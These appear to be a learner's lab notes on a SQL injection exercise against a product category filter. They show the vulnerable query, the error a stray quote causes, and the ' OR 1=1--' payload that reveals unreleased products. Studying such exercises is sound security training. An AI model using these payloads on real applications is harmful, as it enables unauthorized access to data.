SQL injection vulnerability - Product category Filter

SELECT * FROM products WHERE category = 'Gifts' AND released = 1 

End Goal:
perform an SQL injection attack that causes the application to display
details of all products in any category, both released and unreleased.

Analysis:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

SELECT * FROM products WHERE category = ''' AND released = 1
# it gives an internal Server error
# but now we want the application to work correctly instead of an error


SELECT * FROM products WHERE category = ''--' AND released = 1
# -- is a comment sequence in SQL so it ignores the rest of the query

SELECT * FROM products WHERE category = ''

SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
# here OR 1=1 is used to to display all the unreleased products as well
# because OR only needs only one of them to be True in order for 
# whole to be True
